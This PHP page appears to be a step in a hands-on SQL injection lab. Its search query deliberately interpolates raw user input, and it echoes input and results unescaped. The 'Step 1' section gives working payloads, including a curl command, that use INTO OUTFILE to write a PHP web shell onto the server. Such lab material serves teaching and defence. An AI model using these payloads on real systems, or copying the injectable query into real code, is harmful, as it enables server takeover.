<?php

    require 'functions.php';
    require 'config.php';

    $search = $_GET['search'] ?? null;

    if ($search) {
        $sql = "SELECT * FROM contact WHERE last_name LIKE '%$search%'";
        $stmt = $db->prepare($sql);
        $stmt->execute();
        $contacts = $stmt->fetchAll(PDO::FETCH_ASSOC);
    }

?>

<html lang="en">
    <head>
        <title>SQL Injection Example</title>
        <link rel="stylesheet" href="css/style.css" />
        <script src="https://code.jquery.com/jquery-3.3.1.min.js"></script>
    </head>
    <body>
		<div class="container">
        <h2>Insecure webform</h2>
        <p>Search form. Some contacts include Joan Smith, John Smith and Patrick Evans.</p>
        
        <h3>Search Contacts</h3>
        <form method="GET" action="">
            <dl>
                <dt>Search:</dt><dd><input type="text" name="search" value="<?= $search ?>" id="search-input" /></dd>
            </dl>
            <input type="submit" name="submit" value="submit" />
        </form>

        <h3>Contact List</h3>
        <?php if ($contacts) : ?>
            <table class="contact-list">
                <?php foreach ($contacts as $contact) : ?>
                <tr>
                    <?php foreach ($contact as $field) : ?>
                    <td><?= $field ?></td>
                    <?php endforeach ?>
                </tr>
                <?php endforeach ?>
            </table>
        <?php else : ?>
            <p>No contacts found</p>
        <?php endif ?>

        <div class="code-block">
            <h4>Backend code</h4>
            <p>
                $search = $_GET['search'] ?? null;<br /><br />
                
                $sql = "SELECT * FROM contact WHERE last_name LIKE '%<em class="code-highlight">$search</em>%'";
            </p>
        </div>
        </div>
			
        <div class="steps">
            <h2>Step 1</h2>
            <h4>Create malicious file on the host</h4>
            <p>Use the <em>INTO OUTFILE</em> MySQL command to create a PHP script on the server that will run our commands.</p>
            <p>Search value: <em class="input">jones';SELECT "&lt;?php system($_GET['cmd']);" INTO OUTFILE "/var/www/web/images/system.php";'</em></p>
            <p><strong>Note:</strong> We need to use cURL here as the opening PHP tag causes issues in the browser.</p>
            <p><em class="input">curl -X POST "http://insecure.local/login.php" --data "username=damien&amp;password=mypass');SELECT \"&lt;?php system(\$_GET['cmd']);\" INTO OUTFILE \"/var/www/web/images/system.php\";'"</em></p>
            <div class="code-block">
                <h4>Resulting SQL</h4>
                <p>
                SELECT * FROM contact WHERE last_name LIKE '%<em class="code-highlight">$search</em>%';select "&lt;?php system(['cmd'])" INTO OUTFILE "/var/www/web/images/system.php";'')
                </p>
            </div>
		</div>	
        <nav>
            <a href="step2.php">Goto step 2</a>
        </nav>
    </div>

    <script>
        window.onload = function() {
          $('em.input').click(function() {
            str = $(this).html();
            $('#search-input').val(str);
          });
        }
    </script>

    </body>
</html>
